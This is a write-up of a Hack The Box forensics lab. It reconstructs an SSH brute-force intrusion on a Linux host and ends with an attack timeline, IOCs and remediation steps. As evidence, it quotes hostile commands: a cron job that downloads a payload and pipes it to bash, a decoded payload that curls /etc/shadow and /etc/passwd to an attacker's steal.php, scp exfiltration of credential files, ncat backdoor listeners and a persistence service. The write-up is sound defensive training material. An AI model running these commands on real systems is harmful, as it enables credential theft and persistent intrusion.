---
title: "HTB-LuckyShot"
date: 2026-02-02
draft: false
tags:
  - DFIR
  - Log Analysis
  - Linux
  - T1110
  - T1053.003
  - T1136.001
  - T1098.004
  - T1543.002
platform: DFIR
---

{{< infobox difficulty="Easy" os="Linux" date="2026-02-02" >}}
**Description**
The IT Manager of Techniqua-Solutions Corp. is responsible for managing the company’s infrastructure. As part of his daily work, he frequently accesses company servers and workstations. One morning, the IT Manager discovered that several critical company files were missing, while others had been modified or replaced with unfamiliar ones. Concerned about a potential breach, he reported the issue to the security team.

As an incident response analyst, your task is to investigate the case. You have been provided with a forensic image of the IT Manager’s machine.

### <span style="color:red">what we've got</span>
```
├── bodyfile
│   └── bodyfile.txt
├── hash_executables
│   ├── hash_executables.md5
│   └── hash_executables.sha1
├── live_response
│   ├── hardware
│   ├── network
│   ├── packages
│   ├── process
│   ├── storage
│   └── system
└── [root]
    ├── etc
    ├── home
    ├── lib
    ├── root
    ├── run
    ├── snap
    ├── tmp
    ├── usr
    └── var
```
### <span style="color:red">first access</span>
the attacker started brute forcing at **2025-02-10 19:38:18** from `192.168.161.198`  
*auth.log*:
```
LuckyShot sshd[12985]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.161.198  user=root
LuckyShot sshd[12984]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.161.198  user=root
LuckyShot sshd[12993]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192...
```

at **2025-02-10 19:39:03** the attacker successfully log in for the first time as administrator
*auth.log*:
```
LuckyShot sshd[13105]: Accepted password for administrator from 192.168.161.198 port 46160 ssh2
LuckyShot sshd[13105]: pam_unix(sshd:session): session opened for user administrator(uid=1000) by administrator(uid=0)
```
The attacker performed system enumeration, identifying user accounts, groups, and running processes. After verifying sudo privileges, he cloned the `LaZagne` tool `mimipenguin.sh` script and for credential dumping. then he transfered a sensitive files (`Passwords_Backup.txt, Server_Credentials.txt`) to a remote machine
```console
$ scp Passwords_Backup.txt Server_Credentials.txt kali@192.168.161.198:~/Desktop/
```
### <span style="color:red">persistance</span>
#### new service
at **2025-02-10 20:11:19** the attacker executed a malicious script `sys_monitor.sh`
`3ae5dea716a4f7bfb18046bfba0553ea01021c75  /home/administrator/tmp/sys_monitor.sh`

this script for persistance add new service: `systemd-networkm.service`
```
[Unit]
Description=System Network Management
After=network.target

[Service]
ExecStart=/bin/bash /tmp/sys_monitor.sh
Restart=always
User=root

[Install]
WantedBy=multi-user.target
```

#### startup files
in root startup files `.bashrc` found `ncat -lvp 7575 &` and in `.profile` found `ncat -lvp 9000 &`

analyzing `/root/.ssh/authorized_keys`, I identified the attacker's public key. The key comment kali@kali reveals the origin username and hostname.
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCnoiT13BNG/mRCoizCTYQncnZkhm62c0WivVvTZ32FxGh+J8HzLcYnI3/FLPt2FfAkjXV1+LU+gLHtFossAIo4BfuZj7c1xwxbuEbGjD5sEYI9ayiIGV+NUM99zweVI2fVt18s0y99EHS1h94aqMT3J/J7hjbMhAuQC8ij295WReT3XvXkZ0U6YI/qFPoO7VnE4OPjq8Cgmfr7PXdpsLBs5FZ5qX6T9nWuU3yDSZWMLGyYMo0VlT1oY7fcUJyMRCjG9YHxFlGhX+136qLD+PlDWMaBJqVHfiTNyP8V4Yz9gitJ45veO6dPTa9sUHUe2LeNAVFmEgAvfaLyMZPBl6CEXzvtZbYH4Yld1U86tascPTXtLDdLipe2ElMisuld58gqWQYctkyuPTvkJwlZvxfVcFN0bA3uapEi2S3toQdoLJZO06UZxOJBBI2pjFIBJkJdiIpOzsvNPTs46hsmaIN97RHAWgm8fTd1yjXOiqoZlAo9Jujvh6KAuHiHANAuztSvC5IrgVWM5wiZBQRAVfrZanojjZr8ig22GEKupEuwCgNHc4V+VLj6ki0u5E6xeBEyhH9qZO3erK9xvqR5VMGqUnfa6qo9/ORaILj4CpX08/5He9JbgOIPpOOFEVm6e/AudL8PcPsE+oJwlXZFoyWoRyAd7CJBkbEaGHTjQ643Lw== kali@kali
```
#### new user
at **2025-02-10 20:11:21**. the attacker add new user `Regev` for pesistence
*auth.log*:
```bash
LuckyShot sudo:     root : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash -G sudo,adm Regev
LuckyShot useradd[16903]: new group: name=Regev, GID=1001
LuckyShot useradd[16903]: new user: name=Regev, UID=1001, GID=1001, home=/home/Regev, shell=/bin/bash, from=/dev/pts/3
LuckyShot useradd[16903]: add 'Regev' to group 'adm'
LuckyShot useradd[16903]: add 'Regev' to group 'sudo'
LuckyShot useradd[16903]: add 'Regev' to shadow group 'adm'
LuckyShot useradd[16903]: add 'Regev' to shadow group 'sudo'
```

### <span style="color:red">data exfiltration</span>
#### malicious cron
in `/etc/cron.d/systemcheck` i found malicious cron job configured to execute every minute with root privileges. The command downloads a payload from Pastebin, and executes it.
*auth.log*:
```bash
2025-02-10T20:11:20.744693+02:00 LuckyShot sudo:     root : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tee /etc/cron.d/syscheck
```
```bash
/1 * * * root command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash
```

analysing that file ...
```console
$ echo "=AHaw5CbhVGdz9CO5EjLxYTMugjNx4iM5EzLvoDc0RHag0CQgQWLgQ1UPBFIY1CIsJXdjBCfgQ2dzNXYw9yY0V2LgQjNlNXYipQDwhGcuwWYlR3cvgTOx4SM2EjL4YTMuITOx8yL6AHd0hGItAEIk1CIUN1TQBCWtACbyV3YgwHI39GZhh2cvMGdl9CI0YTZzFmY" | rev |base64 -d
base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php
base64 /etc/passwd | curl -X POST -d @- http://192.168.161.198/steal.php 
```
### <span style="color:lightblue">Attack Timeline</span>
```
2025-02-10 19:38:18 - Attempt SSH brute-force attack initiated from 192.168.161.198 targeting root account 
2025-02-10 19:39:03 - Successful Authentication as `administrator` user via SSH 
2025-02-10 19:39-20:11 - System enumeration performed
2025-02-10 ~20:00 - Passwords_Backup.txt, Server_Credentials.txt exfiltrated via SCP to 192.168.161.198 
2025-02-10 20:11:19 - Persistence with systemd service `systemd-networkm.service` created to execute sys_monitor.sh 
2025-02-10 20:11:20 - Persistence with cron job installed in `/etc/cron.d/syscheck` for automated payload execution 
2025-02-10 20:11:21 - Persistence with new privileged user `Regev` created with sudo and adm group membership 
2025-02-10 20:11:xx - Persistence with attacker's SSH public key added to `/root/.ssh/authorized_keys` 
2025-02-10 20:11:xx - Persistence with netcat listeners configured in `/root/.bashrc` (port 7575) and `/root/.profile` (port 9000) 
Ongoing -  Automated exfiltration of /etc/shadow and /etc/passwd via malicious cron job 
```
### <span style="color:lightblue">IOCs</span>
**Network**  
\- attacker IP Address: `192.168.161.198`  
\- `pastebin.com/raw/SAuEez0S`  
\- `http://192.168.161.198/steal.php`  
\- backdoor listening ports: 7575/tcp, 9000/tcp (ncat)  

**Files**  
\- `/home/administrator/tmp/sys_monitor.sh`   
\- `/etc/systemd/system/systemd-networkm.service`   
\- `/etc/cron.d/syscheck`   
\- `/tmp/sys_monitor.sh`   

**Modified System Files**  
\- `/root/.bashrc` - Contains `ncat -lvp 7575 &`  
\- `/root/.profile` - Contains `ncat -lvp 9000 &`  
\- `/root/.ssh/authorized_keys` - Unauthorized SSH key added  

**User**
\- Backdoor User: `Regev` (UID: 1001, GID: 1001)

### <span style="color:lightblue">Recomendations</span>
**Immediate Actions**
1. Isolate compromised system from network
2. Block attacker IP 192.168.161.198 on firewall
3. Remove backdoor user `Regev`
4. Disable malicious service `/etc/systemd/system/systemd-networkm.service`
5. Remove malicious cron: `/etc/cron.d/syscheck`
6. Remove `ncat -lvp` entries from `/root/.bashrc` and `/root/.profile`
7. Remove unauthorized SSH key from `/root/.ssh/authorized_keys`
8. Kill netcat listeners: `pkill -f "ncat -lvp"`

**Credential**
1. Reset passwords for administrator and root accounts
2. Rotate all credentials from exfiltrated files (Passwords_Backup.txt, Server_Credentials.txt)

**System**
1. `SSH` - disable root login, implement key-based auth only, brute-force protection
2. Configure auditd for monitoring `/etc/passwd`, `/etc/shadow`, systemd services, cron jobs, SSH keys
